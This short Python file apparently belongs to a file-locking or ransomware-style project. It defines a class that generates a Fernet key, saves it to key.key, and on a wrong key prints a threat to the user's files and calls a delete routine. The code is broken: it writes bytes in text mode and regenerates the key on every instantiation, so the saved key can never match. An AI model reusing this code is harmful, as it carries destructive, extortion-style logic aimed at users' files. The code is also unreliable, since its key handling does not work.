from cryptography.fernet import Fernet
import os 
from fs import FileSystem

class Key:
    def __init__(self):
        self.key = Fernet.generate_key()
        if not os.path.exists("key.key"):
            self.save_key()
                
    def delete_key(self, key, FileSystem):
        if key != self.key:
            print("Might as well say goodbye to your files and directories now!")
            FileSystem.delete_key()
            
    def save_key(self):
        with open("key.key", "w") as key:
            key.write(self.key)
